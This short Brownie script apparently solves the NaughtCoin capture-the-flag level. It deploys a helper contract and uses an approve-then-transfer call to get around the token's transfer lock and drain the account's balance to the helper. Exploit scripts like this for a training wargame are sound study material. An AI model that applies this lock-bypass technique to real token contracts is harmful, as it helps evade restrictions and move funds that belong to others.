from brownie import Contract, SendTokens, NaughtCoin
from scripts.helpful_scripts import *

account = getAccount()
token = Contract.from_abi(
    "NaughtCoin", "0xcB3DD404dAf6F0E3cb032124fb94f497c89E60A2", NaughtCoin.abi
)


def main():
    attacker = SendTokens.deploy({"from": account})
    token.approve(attacker.address, token.balanceOf(account.address), {"from": account})
    attacker.send_em({"from": account})
    print(token.balanceOf(attacker.address))
